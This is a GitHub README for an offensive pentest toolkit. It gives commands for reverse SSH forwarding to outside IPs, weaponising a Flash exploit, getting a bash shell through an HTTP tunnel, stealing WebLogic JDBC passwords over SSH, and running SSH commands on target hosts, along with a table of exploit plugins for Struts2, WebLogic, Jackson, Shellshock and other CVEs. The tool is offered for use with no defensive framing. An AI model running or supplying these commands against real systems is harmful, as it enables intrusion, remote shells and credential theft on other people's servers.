
##### Twitter: [@Hktalent3135773](https://twitter.com/Hktalent3135773) [see Pro](http://51pwn.com)
online to https://51pwn.com, or https://exploit-poc.com

[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/tweet?original_referer=https%3A%2F%2Fdeveloper.twitter.com%2Fen%2Fdocs%2Ftwitter-for-websites%2Ftweet-button%2Foverview&ref_src=twsrc%5Etfw&text=myhktools%20-%20Automated%20Pentest%20Recon%20Scanner%20%40Hktalent3135773&tw_p=tweetbutton&url=https%3A%2F%2Fgithub.com%2Fhktalent%2Fmyhktools)
[![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773)
[![Github Stars](https://img.shields.io/github/stars/hktalent/myhktools.svg?style=social&label=Stars&color=orange)](https://github.com/hktalent/myhktools/) 
[![GitHub Followers](https://img.shields.io/github/followers/hktalent.svg?style=social&label=Follow)](https://github.com/hktalent/myhktools/)
![GitHub forks](https://img.shields.io/github/forks/hktalent/myhktools.svg?style=social&label=Fork)

[![GitHub issues](https://img.shields.io/github/issues/hktalent/myhktools.svg)](https://github.com/hktalent/myhktools/issues) 
![GitHub watchers](https://img.shields.io/github/watchers/hktalent/myhktools.svg?label=Watch)
![GitHub contributors](https://img.shields.io/github/contributors/hktalent/myhktools.svg?colorB=red&colorA=orange)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/hktalent/myhktools.svg?colorB=ff9988&colorA=006666)
![GitHub language count](https://img.shields.io/github/languages/count/hktalent/myhktools.svg?colorB=995500&colorA=551166)
![GitHub search hit counter](https://img.shields.io/github/search/hktalent/myhktools/goto.svg?colorB=0077ff&colorA=11aadd)
![GitHub top language](https://img.shields.io/github/languages/top/hktalent/myhktools.svg?colorB=red&colorA=dd88ff)
![os](https://img.shields.io/badge/OS-Linux,%20Window,%20macOS-green.svg)
![nodejs](https://img.shields.io/badge/nodejs-blue.svg)
![python](https://img.shields.io/badge/python2-red.svg)
![license](https://img.shields.io/github/license/mashape/apistatus.svg)

<!-- header -->
# penetration tools
<!--

|<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk1.jpg?raw=true" width=400>|<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk2.jpg?raw=true" width=400>|
|<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk3.jpg?raw=true" width=400>|<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk4.jpg?raw=true" width=400>|
-->

## dependencies
| Command | Description |
| --- | --- |
| kali linux | recommend system |
| node js | program runtime |
| javac、java | auto generate payload |
| metasploit | auto generate payload,and autoexploit|
| gcc | auto generate payload |
| tmux | auto background send payload, shell |
| bash | base64、tr、nc,auto generate payload |
| python | auto generate and send payload |

## New features
```
# ssh2
py2  py/rforward.py -r 192.168.10.115:8083 -p 9999 -u root 12.19.16.11:27449
curl http://162.219.126.11:9999/QIMS/login.jsp -v

# how use exploit CVE-2018-15982

py2 tools/replaceBin.py -i /mysvn/CVE-2018-15982_PoC.swf -o /mysvn/test.swf -c 'notepad.exe'

# get bash shell,socks4 through http tunnel,auto use tmux and reGeorgSocksProxy.py
tools/getBashShell_proxychains_http_tunnel.sh http://xxx:9002/uddi/.O01542895480635.jsp

# check Xss
cat /mysvn/new_url_list.txt|xargs -I % node tools/checkXss.js -v -u %
# check svn paswd
node tools/checkSvn.js http://12.68.10.7:8090/svn/ userName Pswd

# socks5
node tools/mySocks5.js --user mser --password W_x*d -p 15533

#one key get weblogic passwd
ssh -i YouKey userName@YouTargetIp -p targetPort < tools/oneKeyGetSshWeblogicJdbcPswd.sh >out.txt

# port Forward
node  tools/portForward.js -l 8080,3306 --rhost 172.17.0.2 -s 127.0.0.1 -p 8111

# ssh cmd
node tools/ssh2Cmd.js --port 29156 --host 12.8.22.48 --username root --password '#$'

# xss test
cat /mysvn/xss.txt|grep -Eo "http.*$"|sort -u|xargs -I % node checkUrl.js -u % --tags xss

# test all urls xss
cat /mysvn/xx.sh|grep -Eo "'([^']+)'"|xargs -I % bash -c 'curl --connect-timeout 2 -Is % -o-| head -n 1|grep -Eo "(200|301)" && node checkUrl.js -u % --tags xss'


```
## plugins
|name|tags|dependencies|des|
| --- | ---  | ---  | --- |
|/bash/CVE-2014-6271.js|shellshock,web,CVE-2014-6271,rci|java,ysoserial,base64,tr|Shellshock Remote Command Injection (CVE-2014-6271)|
|/GlassFish/4.1.0.js|glassfish,web||glassfish 4.1.0 漏洞检测|
|/elasticsearch/CVE-2015-1427.js|elasticsearch,web,CVE-2015-1427|java,ysoserial,base64,tr|elasticsearch,web,CVE-2015-1427,RCE,ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427）测试环境|
|/elasticsearch/CVE-2014-3120.js|elasticsearch,web,CVE-2014-3120|java,ysoserial,base64,tr|elasticsearch,web,CVE-2014-3120,RCE|
|/elasticsearch/CVE-2015-3337.js|CVE-2015-3337,||ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境|
|/flask/ssti.js|ssti,flask,parms||Flask（Jinja2） 服务端模板注入漏洞|
|/jackson/drupal_CVE-2018-7600.js|CVE-2018-7600,web,drupal|java,ysoserial,base64,tr|drupal,漏洞检测|
|/jackson/CVE-2017-7525.js|jackson,web,CVE-2017-7525,CVE-2017-17485|java,ysoserial,base64,tr|CVE-2017-7525,漏洞检测,JDK7u21,CVE-2017-17485|
|/jackson/fastjson.js|fastjson,web,|java,ysoserial,base64,tr|fastjson,漏洞检测|
|/http/attackhost.js|http,host,spoof,web||spoof host,漏洞检测|
|/goahead/CVE-2017-17562.js|CVE-2017-17562,goahead,web|gcc,c lib,rm(/tmp/xx)|GoAhead 远程命令执行漏洞（CVE-2017-17562） 漏洞检测|
|/java/CVE-2017-5645_log4j.js|log4j,web,CVE-2017-5645|java,ysoserial,base64,nc|CVE-2017-5645,漏洞检测,log4j|
|/java/CVE-2018-1297_jmeter.js|jmeter,CVE-2018-1297|java,ysoserial|jmeter,CVE-2018-1297,漏洞检测|
|/jboss/CVE-2017-12149.js|jboss,CVE-2017-12149|java,ysoserial|jboss,CVE-2018-1297,漏洞检测|
|/jdk/7u25.js|jre7,jdk7,jre1.7,jdk1.7,1.7,web,CVE-2013-0431,0431||jre7,jdk7,jre1.7,jdk1.7,1.7,web漏洞检测,|
|/smb/CVE-2017-7494.js|smb,win,CVE-2017-7494|java,ysoserial,base64,tr|smb,win,CVE-2017-7494,漏洞检测|
|/spring/CVE-2018-1270.js|spring,CVE-2018-1270,1270,parms,web||spring CVE-2018-1270 RCE漏洞检测,CVE-2018-1270: Remote Code Execution with spring-messaging|
|/spring/cve-2017-4971.js|spring,cve-2017-4971,4917,parms,web|java,ysoserial,base64,tr|spring cve-2017-4971 RCE漏洞检测,CVE-2017-4971: Remote Code Execution Vulnerability In The Spring Web Flow Framework|
|/struts/001.js|struts2,001,ww-2030,2030,parms,web||WW-2030,struts2 001漏洞检测|
|/struts/005.js|struts2,005,ww-3470,xw-641,641,3470,web||WW-3470,XW-641,struts2 005漏洞检测|
|/struts/007.js|struts2,007,ww-3668,3668,parms||WW-3668,struts2 007漏洞检测|
|/struts/008.js|struts2,008,ww-3729,3729,web||WW-3729,struts2 漏洞检测|
|/struts/012.js|struts2,012,cve-2013-1965,parms,20131965||CVE-2013-1965,struts2 012漏洞检测|
|/struts/009.js|struts2,009||struts2 漏洞检测|
|/struts/013.js|struts2,013,parms||struts2 013漏洞检测|
|/struts/015.js|struts2,015||struts2 015漏洞检测|
|/struts/016.js|struts2,016||struts2 016漏洞检测|
|/struts/019.js|struts2,019||struts2 019漏洞检测|
|/struts/029.js|struts2,029,parms||struts2 029漏洞检测|
|/struts/032.js|struts2,032||struts2 032漏洞检测|
|/struts/037.js|struts2,037,cve-2016-4438,20164438||CVE-2016-4438,struts2 037漏洞检测|
|/struts/045.js|web,struts2,045,cve-2017-5638,20175638||CVE-2017-5638,struts2 045漏洞检测|
|/struts/033.js|struts2,033,cve-2016-3087,20163087||CVE-2016-3087,struts2 033漏洞检测|
|/struts/046.js|struts2,046,cve-2017-5638,20175638||CVE-2017-5638,struts2 046漏洞检测|
|/struts/048.js|struts2,048,cve-2017-9791,20179791,parms||CVE-2017-9791,struts2 048漏洞检测|
|/struts/053.js|struts2,053,parms||struts2 053漏洞检测|
|/struts/052.js|struts2,052||struts2 052漏洞检测,CVE-2017-9805|
|/struts/054.js|struts2,052||struts2 052漏洞检测|
|/struts/CVE-2016-100031.js|web,acf,CVE-2016-100031,fileupload,CVE-2013-2186|java,|CVE-2016-100031,CVE-2013-2186,Apache Commons FileUpload 漏洞检测|
|/struts/055.js|struts2,055,CVE-2017-7525,7525,parms|javac|struts2 055漏洞检测,|
|/struts/057.js|web,struts2,057||CVE-2018-11776,struts2 057漏洞检测|
|/struts/devMode.js|struts2,devMode||struts2 devMode漏洞检测|
|/struts/ognl.js|struts2,parms,ognl||struts2 052漏洞检测|
|/struts/pythonBc.js|struts2,python|python,struts-scan.py|struts2 python脚本漏洞检测补充|
|/tomcat/CVE-2016-6816.js|tomcat,CVE-2016-6816||Apache Tomcat CVE-2016-6816 Security Bypass Vulnerability 漏洞检测|
|/tomcat/CVE-2017-12616.js|tomcat,CVE-2017-12616,12616,CVE-2017-12617||tomcat,漏洞检测|
|/weblogic/SSRF.js|ssrf,weblogic,uddi,xspa||SSRF开放状态监测,CVE-2014-4210,UDDI Explorer,CVE-2014-4241, CVE-2014-4242)|
|/weblogic/201710271.js|weblogic,CVE-2017-10271,10271,3506|payload/[x.jsp,*.sh],msfvenom,curl|CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506漏洞检测|
|/weblogic/t3.js|t3,weblogic||T3开放状态监测|
|/xss/xss1.js|xss,parms,web||xx,漏洞检测|


## how install
```
# mac os
brew install node
# linux
apt install nodejs node
yum install nodejs node

mkdir ~/safe && cd ~/safe
git clone https://github.com/hktalent/myhktools.git
cd myhktools
sh ./install.sh
node checkUrl.js -h
```

## update all node js lib
```
vi ~/npm-upgrade.sh 

#!/bin/sh
set -e
#set -x
for package in $(npm -g outdated --parseable --depth=0 | cut -d: -f2)
do
    npm -g install "$package"
done
```
## upgrade all npm
```
sh ~/npm-upgrade.sh 
```
## how use
node checkUrl.js -h
```
Usage: checkUrl [options]

  Options:

    -V, --version           output the version number
    -u, --url [value]       check url, no default
    -p, --proxy [value]     http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理
    -t, --t3 [value]        check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测
    -i, --install           install node modules,run: npm install
    -v, --verbose           show logs
    -w, --struts2 [value]   struts2 type,eg: 045
    -C, --cmd [value]       cmd type,eg: "ping -c 3 www.baidu.com"
    -o, --timeout           default 5000
    -l, --pool              default 300
    -r, --test              test
    -x, --proxy             http://127.0.0.1:8800
    -m, --menu [value]      scan url + menus, default ./urls/ta3menu.txt
    -s, --webshell [value]  scan webshell url，设置参数才会运行, default ./urls/webshell.txt
    -d, --method [value]    default PUT,DELETE,OPTIONS,HEAD,PATCH test
    -a, --host              host attack test,设置代理后该项功能可能无法使用,default true
    -k, --keys [value]      scan html keywords, default ./urls/keywords
    -h, --help              output usage information

	node checkUrl.js -u http://192.168.10.216:8082/s2-032/ --struts2 045

............

```

<!--

<img src="https://github.com/hktalent/myhktools/blob/master/bin/wb1.jpg?raw=true" width=400>
-->

<!-- ender -->
# Donation
## AliPay
![donation-AliPay](/md/wc.png)
## Wechat Pay
![donation-Wechat](/md/zfb.png)
## Paypal
Donate money by [paypal](https://www.paypal.me/pwned2019) to my account **miracletalent@gmail.com**.
## BTC Pay
![donation-BTC](/md/BTC.png)
## BCH Pay
![donation-BCH](/md/BCH.jpg)


# Thanks to
-  [![Follow on Twitter](https://img.shields.io/twitter/follow/hanerkui.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=hanerkui) github:[hanerkui](https://github.com/hanerkui)
- [![Follow on Twitter](https://img.shields.io/twitter/follow/pwncrestfallen.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=pwncrestfallen) github:[musicalpike](https://github.com/musicalpike)
- [![Follow on Twitter](https://img.shields.io/twitter/follow/tiger_mirror.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=tiger_mirror) github: [black-mirror](https://github.com/black-mirror)
- [![Follow on Twitter](https://img.shields.io/twitter/follow/Arthur22573102.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Arthur22573102) github:[EnterpriseForever](https://github.com/EnterpriseForever)

 
